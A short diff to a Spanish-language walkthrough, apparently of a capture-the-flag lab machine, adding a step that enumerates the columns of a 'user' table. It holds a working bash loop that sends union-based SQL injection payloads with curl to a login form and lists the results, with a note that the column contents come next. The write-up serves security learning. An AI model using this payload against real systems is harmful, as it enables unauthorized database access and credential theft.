@@ -76,9 +76,19 @@ Para enumerar solo la tabla main
 ```
 
 Encontramos
-`blog`, `blog_comments`, `users`
+`blog`, `blog_comments`, `user`
 
-Enumeraremos ahora las columnas
+Enumeraremos ahora las columnas de user
+```bash
+for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,column_name from information_schema.columns where table_schema=\"main\" and table_name=\"user\" limit $i,1-- -&password=test" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
+```
+
+Encontramos
+`email`, `id`, `name`, `password`
+
+
+Enumeraremos el contenido de las siguientes columnas
+
 
 
 
